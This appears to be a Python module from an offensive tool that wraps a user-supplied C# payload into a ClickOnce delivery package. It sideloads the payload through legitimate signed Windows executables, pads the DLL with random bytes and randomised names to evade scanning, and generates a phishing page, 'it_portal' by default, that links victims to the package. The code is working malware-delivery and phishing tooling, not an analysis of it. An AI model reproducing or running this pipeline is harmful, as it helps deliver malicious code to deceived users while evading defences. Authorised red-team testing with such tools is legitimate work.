"""
Custom ClickOnce builder — wraps a user-supplied Program.cs in full ClickOnce delivery.
The user owns the payload logic; this builder handles compilation and packaging.
"""
import os
import re
import json
import shutil
import string
import random
import traceback
import zipfile
from base64 import b64decode
from pathlib import Path
from string import Template
from tempfile import TemporaryDirectory

from .custom_models import CustomPayload
from .logging import PerRequestLogger, GlobalLogger
from .misc import run_cmd_check_file
from .consts import (
    BUILD_DIR, SRC_TEMPLATE_DIR, WEBSERVER_CONFIG_DIR, PHISH_TEMPLATE_DIR,
    ALLOWED_PHISH_TEMPLATES, SIDELOAD_OPTIONS, BUILD_CMD, DATA_CS_SIZE_IN_MB,
    TZSYNC, PERFWATSON, SVCHUB, POWERSHELL,
)


class CustomBuilder:
    def __init__(self, buildid: str, payload: CustomPayload):
        self.buildid = buildid
        self.build_dir = os.path.join(BUILD_DIR, buildid)
        self._temp_dir = TemporaryDirectory(delete=False)
        self.temp_dir = self._temp_dir.name
        self.payload = payload
        self.logger = PerRequestLogger(buildid)
        self.tgt_dll = os.path.join(self.temp_dir, "bin", "x64", "Release", f"{self.payload.name}.dll")
        self.sideload_exe = None

    def verify(self):
        if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_]*$", self.payload.name):
            raise Exception("Application Name does not match provided regex")
        if self.payload.inflate > 500 or self.payload.inflate < 0:
            raise Exception("Invalid payload inflation size")
        if self.payload.sideload.lower() not in SIDELOAD_OPTIONS:
            raise Exception("Invalid Sideload option provided")
        if not self.payload.program_cs_b64:
            raise Exception("program_cs_b64 is required")
        self.logger.debug("Validated all parameters")

    def copy_template_files(self):
        shutil.copytree(SRC_TEMPLATE_DIR, self.temp_dir, dirs_exist_ok=True)
        self.logger.debug("Copied template files from %s to %s", SRC_TEMPLATE_DIR, self.temp_dir)
        if self.payload.icon:
            icon_path = os.path.join(self.temp_dir, "icon.ico")
            with open(icon_path, "wb") as f:
                f.write(b64decode(self.payload.icon))
            self.logger.debug("Replaced icon.ico with custom upload")

    def write_user_program_cs(self):
        """Overwrite the template Program.cs with the user-supplied source."""
        program_cs = os.path.join(self.temp_dir, "Program.cs")
        with open(program_cs, "wb") as f:
            f.write(b64decode(self.payload.program_cs_b64))
        self.logger.debug("Wrote user Program.cs (%d bytes)", os.stat(program_cs).st_size)

    def template_files(self):
        """Rename project files and generate Data.cs for optional inflation."""
        os.rename(
            os.path.join(self.temp_dir, "project.csproj"),
            os.path.join(self.temp_dir, f"{self.payload.name}.csproj"),
        )
        os.rename(
            os.path.join(self.temp_dir, "project.manifest"),
            os.path.join(self.temp_dir, f"{self.payload.name}.manifest"),
        )
        os.rename(
            os.path.join(self.temp_dir, "project.application"),
            os.path.join(self.temp_dir, f"{self.payload.name}.application"),
        )

        data_cs_file = os.path.join(self.temp_dir, "Data.cs")
        with open(data_cs_file, "w") as f:
            template_1 = """
                namespace __Padding
                {
                    internal class Data
                    {
                        private static readonly byte[] data = new byte[]
                        {
                        """
            template_2 = """
                        };

                        static unsafe void REPLACEFUNCNAME()
                        {
                            fixed (byte* ptr = data)
                            {
                            }
                        }
                    }
                }""".replace("REPLACEFUNCNAME", "".join(random.choices(string.ascii_letters, k=16)))

            f.write(template_1)
            data_cs_mb = self.payload.inflate if self.payload.inflate <= DATA_CS_SIZE_IN_MB else DATA_CS_SIZE_IN_MB
            self.logger.debug("Creating Data.cs to inflate payload by %d MB", data_cs_mb)
            for _ in range(int(data_cs_mb * 1024 * 1024 / 32)):
                byte_str = str(list(os.urandom(32))).replace("[", "").replace("]", ",\n")
                f.write(byte_str)
            f.write(template_2)
        self.logger.debug("Generated Data.cs (%d bytes)", os.stat(data_cs_file).st_size)

    def compile_artefacts(self):
        self.logger.debug("Building artefacts with: %s", BUILD_CMD)
        curr_dir = os.getcwd()
        try:
            os.chdir(self.temp_dir)
            run_cmd_check_file(BUILD_CMD, self.tgt_dll, self.logger)
        finally:
            os.chdir(curr_dir)

    def inflate_artefact(self):
        extra_mb = self.payload.inflate - DATA_CS_SIZE_IN_MB
        if extra_mb <= 0:
            return
        self.logger.debug("Post-compile inflating DLL by %d MB", extra_mb)
        with open(self.tgt_dll, "ab") as f:
            for _ in range(extra_mb):
                f.write(os.urandom(1024 * 1024))
        self.logger.debug("Post-compile inflation complete; DLL size now %d bytes", os.stat(self.tgt_dll).st_size)

    def prepare_files_in_build_dir(self):
        if self.payload.sideload.lower() == "tzsync":
            self.sideload_exe = TZSYNC
        if self.payload.sideload.lower() == "perfwatson2":
            self.sideload_exe = PERFWATSON
        if self.payload.sideload.lower() == "systemhost":
            self.sideload_exe = SVCHUB
        if self.payload.sideload.lower() == "powershell":
            self.sideload_exe = POWERSHELL

        shutil.copy(self.sideload_exe.path, self.build_dir)

        shutil.copy(self.tgt_dll, os.path.join(self.build_dir, f"{self.payload.name}.dll.deploy"))
        shutil.copy(
            os.path.join(self.temp_dir, "bin", "x64", "Release", "Newtonsoft.Json.dll"),
            os.path.join(self.build_dir, "Newtonsoft.Json.dll.deploy"),
        )

        # Empty config.json.deploy keeps the manifest template substitution ($config_size) valid
        config_json_path = os.path.join(self.build_dir, "config.json.deploy")
        with open(config_json_path, "w") as f:
            json.dump([], f)

        with open(os.path.join(SRC_TEMPLATE_DIR, "project.exe.config.deploy"), "r") as f:
            contents = f.read()
        with open(os.path.join(self.build_dir, f"{self.sideload_exe.exe}.config.deploy"), "w") as fw:
            fw.write(contents.replace("REPLACEASSEMBLYNAME", self.payload.name))

        with open(os.path.join(SRC_TEMPLATE_DIR, "project.manifest"), "r") as f:
            contents = f.read()
        with open(os.path.join(self.build_dir, f"{self.payload.name}.manifest"), "w") as fw:
            fw.write(
                Template(contents).safe_substitute(
                    clickonce_name=self.payload.name,
                    dll_size=os.stat(self.tgt_dll).st_size,
                    newtonsoft_dll_size=os.stat(
                        os.path.join(self.build_dir, "Newtonsoft.Json.dll.deploy")
                    ).st_size,
                    config_size=os.stat(config_json_path).st_size,
                    assembly_name=self.sideload_exe.name,
                    assembly_version=self.sideload_exe.version,
                    assembly_key=self.sideload_exe.key,
                    assembly_size=self.sideload_exe.size,
                    assembly_config_size=os.stat(
                        os.path.join(self.build_dir, f"{self.sideload_exe.exe}.config.deploy")
                    ).st_size,
                )
            )

        with open(os.path.join(SRC_TEMPLATE_DIR, "project.application"), "r") as f:
            contents = f.read()
        with open(os.path.join(self.build_dir, f"{self.payload.name}.application"), "w") as fw:
            fw.write(
                Template(contents).safe_substitute(
                    clickonce_name=self.payload.name,
                    manifest_size=os.stat(
                        os.path.join(self.build_dir, f"{self.payload.name}.manifest")
                    ).st_size,
                    publisher=self.payload.publisher,
                    description=self.payload.description or self.payload.name,
                )
            )

    def generate_phish_page(self):
        template_name = self.payload.phish_template
        if template_name not in ALLOWED_PHISH_TEMPLATES:
            self.logger.warning("Unknown phish template '%s', falling back to it_portal", template_name)
            template_name = "it_portal"
        template_path = os.path.join(PHISH_TEMPLATE_DIR, f"{template_name}.html")
        try:
            with open(template_path, "r", encoding="utf-8") as f:
                html = f.read()
        except FileNotFoundError:
            self.logger.warning("Phish template not found: %s, using fallback", template_path)
            with open(os.path.join(PHISH_TEMPLATE_DIR, "it_portal.html"), "r", encoding="utf-8") as f:
                html = f.read()
        clickonce_link = f"clickonce/{self.payload.name}.application"
        html = html.replace("{{provider_url}}", clickonce_link)
        with open(os.path.join(self.build_dir, "index.html"), "w", encoding="utf-8") as f:
            f.write(html)
        self.logger.debug("Wrote index.html using phish template '%s'", template_name)

    def zip_file(self):
        target_extensions = (".deploy", ".manifest", ".application")
        source_path = Path(self.build_dir)
        matching_files = []
        for ext in target_extensions:
            matching_files.extend(source_path.glob(f"**/*{ext}"))
        if not matching_files:
            raise Exception("No files to zip found")
        output_zip = os.path.join(self.build_dir, f"{self.payload.name}.zip")
        with zipfile.ZipFile(Path(output_zip), "w", zipfile.ZIP_DEFLATED) as zipf:
            for file_path in matching_files:
                if file_path.is_file():
                    relative_path = file_path.relative_to(source_path)
                    zipf.write(file_path, os.path.join("clickonce", str(relative_path)))
                    os.remove(file_path)
                    self.logger.debug("Added clickonce/%s", relative_path)
            index_path = os.path.join(self.build_dir, "index.html")
            if os.path.isfile(index_path):
                zipf.write(index_path, "index.html")
                os.remove(index_path)
                self.logger.debug("Added index.html")
            if os.path.isdir(WEBSERVER_CONFIG_DIR):
                for fname in os.listdir(WEBSERVER_CONFIG_DIR):
                    src = os.path.join(WEBSERVER_CONFIG_DIR, fname)
                    if os.path.isfile(src):
                        zipf.write(src, fname)
                        self.logger.debug("Added server config: %s", fname)
        self.logger.info("Created '%s' with %d ClickOnce files", output_zip, len(matching_files))


def custom_build_func(buildid: str, payload: CustomPayload):
    """Orchestrate the custom ClickOnce build pipeline."""
    builder = None
    try:
        builder = CustomBuilder(buildid, payload)
        builder.logger.debug("%s", payload)

        if not os.path.exists(SRC_TEMPLATE_DIR):
            builder.logger.error("Source Template Directory %s not found", SRC_TEMPLATE_DIR)
            raise FileNotFoundError(f"Source Template Directory {SRC_TEMPLATE_DIR} not found")

        builder.verify()
        builder.copy_template_files()
        builder.write_user_program_cs()
        builder.template_files()
        builder.compile_artefacts()
        builder.inflate_artefact()
        builder.prepare_files_in_build_dir()
        builder.generate_phish_page()
        builder.zip_file()

        meta_path = os.path.join(builder.build_dir, "build-meta.json")
        with open(meta_path, "w") as f:
            json.dump({"type": "custom", "name": payload.name}, f)

        builder.logger.info("Build complete")

    except Exception as e:  # pylint: disable=broad-except
        GlobalLogger.error("Exception occurred: %s", e)
        GlobalLogger.error("Traceback: %s", traceback.format_exc())
        if builder is not None:
            builder.logger.error("Build failed: %s", e)
